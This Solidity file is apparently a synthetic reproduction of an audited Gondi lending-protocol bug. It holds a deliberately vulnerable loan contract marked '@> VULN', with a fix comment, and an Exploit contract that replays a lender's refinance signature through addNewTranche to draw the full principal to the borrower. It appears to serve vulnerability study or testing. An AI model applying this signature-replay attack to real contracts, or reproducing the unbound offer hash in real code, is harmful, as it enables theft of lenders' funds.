// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gondi — refinanceFull / addNewTranche share one lender signature (Code4rena 2024-04, H-17, #35219).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: RenegotiationOffer.hash() has no function type, and execution never consumes
    renegotiationId. A signature the lender made so the borrower could refinanceFull
    (replace the tranche) is accepted by addNewTranche (append a tranche and pull the
    whole principal to the borrower).
    Audited checks preserved below (@> VULN). Lender is an EOA; the signature is a real
    ecrecover over the EIP-712 digest, embedded as bytes (no vm.sign on this path).

    Repo: code-423n4/2024-04-gondi @ b9863d73c08fcdd2337dc80a8b5e0917e18b036c
    MultiSourceLoan.refinanceFull / addNewTranche / _checkSignature, Hash.hash(RenegotiationOffer). */

library Terms {
    uint256 internal constant PRINCIPAL = 1000 ether;
    uint256 internal constant LOAN_ID = 1;
    uint256 internal constant RENEG_ID = 17;
    uint256 internal constant OLD_APR = 1000;
    uint256 internal constant NEW_APR = 500;
    uint256 internal constant DURATION = 365 days;
    uint256 internal constant EXPIRY = 4_000_000_000;
    uint256 internal constant TOKEN_ID = 42;
    uint256 internal constant MAX_TRANCHES = 8;
    address internal constant LENDER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address internal constant OLD_LENDER = 0x000000000000000000000000000000000000B0B5;
    address internal constant COLLECTION = 0x000000000000000000000000000000000000C0C0;
}

/// 18-decimal principal. mintAndApprove is scaffolding so the loan can transferFrom an EOA.
contract PrincipalToken {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mintAndApprove(address holder, address spender, uint256 amount) external {
        balanceOf[holder] += amount;
        totalSupply += amount;
        allowance[holder][spender] = amount;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Reduced MultiSourceLoan. Offer hash and the two signature checks match the audit.
contract MultiSourceLoan {
    uint256 internal constant PRINCIPAL = Terms.PRINCIPAL;
    uint256 internal constant LOAN_ID = Terms.LOAN_ID;
    uint256 internal constant RENEG_ID = Terms.RENEG_ID;
    uint256 internal constant OLD_APR = Terms.OLD_APR;
    uint256 internal constant NEW_APR = Terms.NEW_APR;
    uint256 internal constant DURATION = Terms.DURATION;
    uint256 internal constant EXPIRY = Terms.EXPIRY;
    uint256 internal constant TOKEN_ID = Terms.TOKEN_ID;
    uint256 internal constant getMaxTranches = Terms.MAX_TRANCHES;
    address internal constant LENDER = Terms.LENDER;
    address internal constant OLD_LENDER = Terms.OLD_LENDER;
    address internal constant COLLECTION = Terms.COLLECTION;

    // keccak256("RenegotiationOffer(uint256 renegotiationId,uint256 loanId,address lender,uint256 fee,uint256[] trancheIndex,uint256 principalAmount,uint256 aprBps,uint256 expirationTime,uint256 duration)")
    bytes32 internal constant RENEGOTIATION_TYPEHASH =
        0x986a160abc209a64a5b0786817ff0aa7a5f5737a4ee6a95197f86290598cd03d;

    struct Tranche {
        uint256 loanId;
        uint256 floor;
        uint256 principalAmount;
        address lender;
        uint256 accruedInterest;
        uint256 startTime;
        uint256 aprBps;
    }

    struct Loan {
        address borrower;
        uint256 nftCollateralTokenId;
        address nftCollateralAddress;
        address principalAddress;
        uint256 principalAmount;
        uint256 startTime;
        uint256 duration;
        Tranche[] tranche;
    }

    struct RenegotiationOffer {
        uint256 renegotiationId;
        uint256 loanId;
        address lender;
        uint256 fee;
        uint256[] trancheIndex;
        uint256 principalAmount;
        uint256 aprBps;
        uint256 expirationTime;
        uint256 duration;
    }

    PrincipalToken public immutable token;
    uint256 public getTotalLoansIssued;
    uint256 public pulledFromLender;
    uint256 public paidToBorrower;
    mapping(uint256 => bytes32) private _loans;
    /// Checked, and only set by an explicit cancel. Execution does not write it.
    mapping(address => mapping(uint256 => bool)) public isRenegotiationOfferCancelled;

    constructor(PrincipalToken _token) {
        token = _token;
    }

    function DOMAIN_SEPARATOR() public view returns (bytes32) {
        return keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("GONDI_MULTI_SOURCE_LOAN")),
                keccak256(bytes("3")),
                block.chainid,
                address(this)
            )
        );
    }

    /// Audited Hash.hash(RenegotiationOffer). No function-type field.
    function hashOffer(RenegotiationOffer memory offer) public pure returns (bytes32) {
        bytes memory encodedIndexes;
        uint256 n = offer.trancheIndex.length;
        for (uint256 i; i < n;) {
            encodedIndexes = abi.encodePacked(encodedIndexes, offer.trancheIndex[i]);
            unchecked {
                ++i;
            }
        }
        return keccak256(
            abi.encode(
                RENEGOTIATION_TYPEHASH,
                offer.renegotiationId,
                offer.loanId,
                offer.lender,
                offer.fee,
                keccak256(encodedIndexes),
                offer.principalAmount,
                offer.aprBps,
                offer.expirationTime,
                offer.duration
            )
        );
    }

    function digest(RenegotiationOffer memory offer) public view returns (bytes32) {
        return keccak256(abi.encodePacked(hex"1901", DOMAIN_SEPARATOR(), hashOffer(offer)));
    }

    function hashLoan(Loan memory loan) public pure returns (bytes32) {
        bytes memory packed;
        uint256 n = loan.tranche.length;
        for (uint256 i; i < n;) {
            Tranche memory t = loan.tranche[i];
            packed = abi.encodePacked(
                packed,
                keccak256(
                    abi.encode(t.loanId, t.floor, t.principalAmount, t.lender, t.accruedInterest, t.startTime, t.aprBps)
                )
            );
            unchecked {
                ++i;
            }
        }
        return keccak256(
            abi.encode(
                loan.borrower,
                loan.nftCollateralTokenId,
                loan.nftCollateralAddress,
                loan.principalAddress,
                loan.principalAmount,
                loan.startTime,
                loan.duration,
                keccak256(packed)
            )
        );
    }

    function previewOffer() public pure returns (RenegotiationOffer memory offer) {
        uint256[] memory idx = new uint256[](1);
        idx[0] = 0;
        offer = RenegotiationOffer({
            renegotiationId: RENEG_ID,
            loanId: LOAN_ID,
            lender: LENDER,
            fee: 0,
            trancheIndex: idx,
            principalAmount: PRINCIPAL,
            aprBps: NEW_APR,
            expirationTime: EXPIRY,
            duration: DURATION
        });
    }

    /// Borrower cash on a same-block refinanceFull. Equal principal and zero interest pay nothing.
    function borrowerDelta(RenegotiationOffer calldata offer, Loan memory loan)
        public
        pure
        returns (uint256 payBorrower, uint256 payLender)
    {
        uint256 netNewLender = offer.principalAmount - offer.fee;
        if (netNewLender > loan.principalAmount) {
            payBorrower = netNewLender - loan.principalAmount;
        } else if (loan.principalAmount > netNewLender) {
            payLender = loan.principalAmount - netNewLender;
        }
    }

    function seed(uint256 loanId, Loan memory loan) external {
        require(_loans[loanId] == bytes32(0), "seeded");
        require(loan.principalAddress == address(token), "token");
        _loans[loanId] = hashLoan(loan);
        if (getTotalLoansIssued < loanId) getTotalLoansIssued = loanId;
    }

    /// EOA branch of the audited _checkSignature. This lender has no code.
    function checkSignature(address signer, bytes32 structHash, bytes calldata signature) public view {
        require(signature.length == 65, "sig len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(signature.offset)
            s := calldataload(add(signature.offset, 32))
            v := byte(0, calldataload(add(signature.offset, 64)))
        }
        bytes32 typed = keccak256(abi.encodePacked(hex"1901", DOMAIN_SEPARATOR(), structHash));
        address recovered = ecrecover(typed, v, r, s);
        require(recovered == signer && recovered != address(0), "sig");
    }

    function _baseLoanChecks(uint256 loanId, Loan memory loan) private view {
        require(hashLoan(loan) == _loans[loanId], "loan");
        require(loan.startTime + loan.duration >= block.timestamp, "expired");
    }

    function _baseRenegotiationChecks(RenegotiationOffer calldata offer, Loan memory loan) private view {
        require(offer.principalAmount != 0, "principal");
        require(loan.tranche.length >= offer.trancheIndex.length, "index");
        require(block.timestamp <= offer.expirationTime, "offer expired");
        require(!isRenegotiationOfferCancelled[offer.lender][offer.renegotiationId], "cancelled");
    }

    /// Borrower-accepted full refinance. Same offer hash as addNewTranche.
    function refinanceFull(RenegotiationOffer calldata offer, Loan memory loan, bytes calldata signature)
        external
        returns (uint256, Loan memory)
    {
        _baseLoanChecks(offer.loanId, loan);
        _baseRenegotiationChecks(offer, loan);
        require(msg.sender == loan.borrower, "caller");
        this.checkSignature(offer.lender, hashOffer(offer), signature);

        (uint256 payBorrower, uint256 payFromBorrower) = borrowerDelta(offer, loan);
        uint256 pulled;
        if (payFromBorrower > 0) {
            token.transferFrom(loan.borrower, offer.lender, payFromBorrower);
        }
        if (payBorrower > 0) {
            token.transferFrom(offer.lender, loan.borrower, payBorrower);
            pulled += payBorrower;
        }
        uint256 n = loan.tranche.length;
        for (uint256 i; i < n;) {
            Tranche memory t = loan.tranche[i];
            uint256 repay = t.principalAmount + t.accruedInterest;
            if (t.lender != offer.lender && repay > 0) {
                token.transferFrom(offer.lender, t.lender, repay);
                pulled += repay;
            }
            unchecked {
                ++i;
            }
        }

        uint256 newLoanId = ++getTotalLoansIssued;
        Tranche[] memory replaced = new Tranche[](1);
        replaced[0] = Tranche({
            loanId: newLoanId,
            floor: 0,
            principalAmount: offer.principalAmount,
            lender: offer.lender,
            accruedInterest: 0,
            startTime: block.timestamp,
            aprBps: offer.aprBps
        });
        loan.tranche = replaced;
        loan.principalAmount = offer.principalAmount;
        loan.duration = (block.timestamp - loan.startTime) + offer.duration;
        _loans[newLoanId] = hashLoan(loan);
        delete _loans[offer.loanId];
        pulledFromLender = pulled;
        paidToBorrower = payBorrower;
        return (newLoanId, loan);
    }

    function addNewTranche(RenegotiationOffer calldata offer, Loan memory loan, bytes calldata signature)
        external
        returns (uint256, Loan memory)
    {
        uint256 loanId = offer.loanId;
        _baseLoanChecks(loanId, loan);
        _baseRenegotiationChecks(offer, loan);
        // @> VULN: refinanceFull verifies this same offer hash. No function type, and renegotiationId is not consumed.
        this.checkSignature(offer.lender, hashOffer(offer), signature);
        // FIX: bind a type tag into the hash and set isRenegotiationOfferCancelled[lender][renegotiationId] = true.
        require(loan.tranche.length != getMaxTranches, "max");

        uint256 newLoanId = ++getTotalLoansIssued;
        Loan memory updated = _addNewTranche(newLoanId, loan, offer);
        _loans[newLoanId] = hashLoan(updated);
        delete _loans[loanId];

        uint256 draw = offer.principalAmount - offer.fee;
        token.transferFrom(offer.lender, updated.borrower, draw);
        pulledFromLender = draw;
        paidToBorrower = draw;
        return (newLoanId, updated);
    }

    /// Audited _addNewTranche: append principalAmount, floor is the senior principal already outstanding.
    function _addNewTranche(uint256 newLoanId, Loan memory loan, RenegotiationOffer calldata offer)
        private
        view
        returns (Loan memory)
    {
        uint256 n = loan.tranche.length;
        Tranche[] memory tranches = new Tranche[](n + 1);
        for (uint256 i; i < n;) {
            tranches[i] = loan.tranche[i];
            unchecked {
                ++i;
            }
        }
        tranches[n] = Tranche({
            loanId: newLoanId,
            floor: loan.principalAmount,
            principalAmount: offer.principalAmount,
            lender: offer.lender,
            accruedInterest: 0,
            startTime: block.timestamp,
            aprBps: offer.aprBps
        });
        loan.tranche = tranches;
        loan.principalAmount += offer.principalAmount;
        return loan;
    }
}

contract Exploit {
    // Precomputed: lender 0xf39F…2266 over digest(previewOffer()) at the loan CREATE address.
    // Forge may vm.sign the same digest; the playground executes these bytes.
    bytes constant LENDER_SIG =
        hex"f7839f5e190d3b5d649650aae9f647bc28635727cebbc9b9093b38bb15c890276d566c05f38460033b6cd5338b0ee06006b3ee6d0e6ab55e065f6d9bd4f62d881c";

    PrincipalToken public token; // CREATE nonce 1
    MultiSourceLoan public loan; // CREATE nonce 2
    uint256 public profit;
    uint256 public outstanding;
    uint256 public trancheCount;
    address public seniorLender;
    address public juniorLender;
    uint256 public juniorFloor;

    constructor() {
        token = new PrincipalToken();
        loan = new MultiSourceLoan(token);
    }

    function lenderSignature() external pure returns (bytes memory) {
        return LENDER_SIG;
    }

    function existingLoan() public view returns (MultiSourceLoan.Loan memory loanState) {
        uint256 loanId = Terms.LOAN_ID;
        uint256 principal = Terms.PRINCIPAL;
        address senior = Terms.OLD_LENDER;
        uint256 apr = Terms.OLD_APR;
        uint256 tokenId = Terms.TOKEN_ID;
        address collection = Terms.COLLECTION;
        uint256 duration = Terms.DURATION;
        MultiSourceLoan.Tranche[] memory tranches = new MultiSourceLoan.Tranche[](1);
        tranches[0] = MultiSourceLoan.Tranche({
            loanId: loanId,
            floor: 0,
            principalAmount: principal,
            lender: senior,
            accruedInterest: 0,
            startTime: block.timestamp,
            aprBps: apr
        });
        loanState = MultiSourceLoan.Loan({
            borrower: address(this),
            nftCollateralTokenId: tokenId,
            nftCollateralAddress: collection,
            principalAddress: address(token),
            principalAmount: principal,
            startTime: block.timestamp,
            duration: duration,
            tranche: tranches
        });
    }

    /// Same signature, used as the refinance the lender actually signed. Borrower is paid 0.
    function showSignedRefinance() external {
        MultiSourceLoan.Loan memory openLoan = existingLoan();
        loan.seed(Terms.LOAN_ID, openLoan);
        token.mintAndApprove(Terms.LENDER, address(loan), Terms.PRINCIPAL);
        loan.refinanceFull(loan.previewOffer(), openLoan, LENDER_SIG);
    }

    function run() external {
        MultiSourceLoan.Loan memory openLoan = existingLoan();
        loan.seed(Terms.LOAN_ID, openLoan);
        MultiSourceLoan.RenegotiationOffer memory offer = loan.previewOffer();
        (uint256 payBorrower,) = loan.borrowerDelta(offer, openLoan);
        require(payBorrower == 0, "signed net");
        require(openLoan.startTime == block.timestamp, "elapsed");
        token.mintAndApprove(Terms.LENDER, address(loan), Terms.PRINCIPAL);

        (uint256 newId, MultiSourceLoan.Loan memory out) = loan.addNewTranche(offer, openLoan, LENDER_SIG);

        profit = token.balanceOf(address(this));
        outstanding = out.principalAmount;
        trancheCount = out.tranche.length;
        seniorLender = out.tranche[0].lender;
        juniorLender = out.tranche[1].lender;
        juniorFloor = out.tranche[1].floor;
        require(newId == 2, "loan id");
        require(profit == Terms.PRINCIPAL, "borrower was not paid the second tranche");
        require(outstanding == Terms.PRINCIPAL * 2, "principal did not double");
        require(trancheCount == 2, "second tranche missing");
        require(seniorLender == Terms.OLD_LENDER, "senior lender");
        require(juniorLender == Terms.LENDER, "junior lender");
        require(juniorFloor == Terms.PRINCIPAL, "junior floor");
        require(out.nftCollateralTokenId == Terms.TOKEN_ID, "collateral");
        require(token.balanceOf(Terms.LENDER) == 0, "lender was not pulled");
        require(loan.paidToBorrower() == Terms.PRINCIPAL, "paid");
        require(!loan.isRenegotiationOfferCancelled(Terms.LENDER, Terms.RENEG_ID), "consumed");
    }
}
